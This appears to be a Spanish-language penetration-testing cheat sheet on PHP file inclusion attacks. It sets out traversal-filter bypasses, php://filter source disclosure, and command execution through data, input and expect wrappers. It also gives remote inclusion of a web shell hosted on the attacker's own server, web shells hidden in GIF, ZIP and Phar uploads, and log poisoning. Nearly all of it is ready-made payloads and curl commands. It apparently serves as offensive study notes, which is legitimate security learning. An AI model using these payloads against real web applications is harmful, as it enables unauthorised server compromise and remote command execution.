

## Basic bypasses
### Non-Recursive Path Traversal Filters

Es un filtro que elimina ../ pero de forma no recursiva asi que se puede bypassear asi :
....//
..././
....////
### Encoding
algunos filtros eliminan ../ pero puedes url encodearlo para bypassearlo

### Appended Extension
-Path Truncation
En versiones antiguas de PHP( antes de PHP 5.3 y 5.4), cadenas > 4096 caracteres se truncaban:
```
non_existing_dir/../../../etc/passwd/./././././ ... (repetido muchas veces)
```
-Null Bytes 
En PHP <5.5, %00 termina la cadena por ende podriamos hacer ../../etc/passwd%00 para eliminar el .php

## PHP filters
Si leemos un archivo como config.php probablemente no podamos ver el codigo fuente puesto que lo renderizara asi que podemos hacer la peticion del codigo fuente en base 64 para que no lo renderice y luego decodificarlo para ver el codgio fuente : 
```
caca?caca=php://filter/read=convert.base64-encode/resource=config
```
## RCE Wrappers

 1.Verificar allow_url_include leyendolo de php.ini . Ejemplo:
 ```
 php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini
```

### Data Wrapper
Permite incluir datos externos, incluso código PHP.Puede decodificar strings en base64 y ejecutar PHP contenido
1.
```
echo '<?php system($_GET["cmd"]); ?>' | base64
```
2.
```
curl 'http://<SERVER>/index.php?language=data://text/plain;base64,<base64 shell>&cmd=<comando>'
```

### Input Wrapper 

```
curl -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER>/index.php?language=php://input&cmd=id"
```
Nota: El comando se pasa vía GET, pero si la app solo acepta POST, el comando puede estar hardcodeado en el shell PHP enviado.

### Expect Wrapper

```
curl "http://<SERVER>/index.php?language=expect://id"
```
es raro que deje puesto que no se suele usar este wrapper
## RCE RFI

Baicamente metes en el campo vulnerable un servidor que estes levantando tu con una revers shell 
1.Crear shell 
```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```
2.Crear un server en HTTP, FTP o SMB
```
sudo python3 -m http.server <PUERTO>
```

```
sudo python -m pyftpdlib -p 21
```

```
impacket-smbserver -smb2support share $(pwd)
```

3.Ejecutar la shell via RFI 

en http : 
```
http://<SERVER_IP>/index.php?language=http://<TU_IP>:<PUERTO>/shell.php&cmd=id
```
en ftp : 
```
ftp://user:pass@<TU_IP>/shell.php
```
en SMB: 
```
\\<TU_IP>\share\shell.php
```

## RCE File uploads

Imagina que te dejan subir un gif a una web :

1.Shell maliciosa
```
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```
GIF8 son los bytes mágicos para identificarla como imagen GIF.
Esto ayuda a pasar controles básicos de validación en la subida.

2.Obtener ruta del archivo subido
Inspeccionar el código HTML para obtener la ruta (ej: /profile_images/shell.gif).

3.A jugar
```
http://server/index.php?page=./profile_images/shell.gif&cmd=id
```

### Técnicas avanzadas alternativas (solo PHP)
#### ZIP upload

Crear un archivo ZIP con el PHP shell dentro, pero nombrarlo con extensión de imagen (ej: shell.jpg)

```
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
```
y usar el wrapper ZIP para inculirlo
```
include('zip://./profile_images/shell.jpg#shell.php');
```
#### Phar upload

Crear un archivo Phar que contenga el código PHP:
```
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```
Compilar y renombrar:
```
php --define phar.readonly=0 shell.php
mv shell.phar shell.jpg
```
Subir `shell.jpg` y usar el wrapper Phar para incluir:
```
include('phar://./profile_images/shell.jpg/shell.txt');
```
Y luego ejecutas los comandos que quieras 
## RCE Log Poisoning
Primero de todo vemos donde guarda la web los logs , en este caso los guarda en : `/var/log/nginx/access.log`

Luego vemos que encabezado de nuestra request es el que guarda en los logs para inyectarle la shell

Por ultimo voolvemos a entrar a los logs para que la shell se ejecute
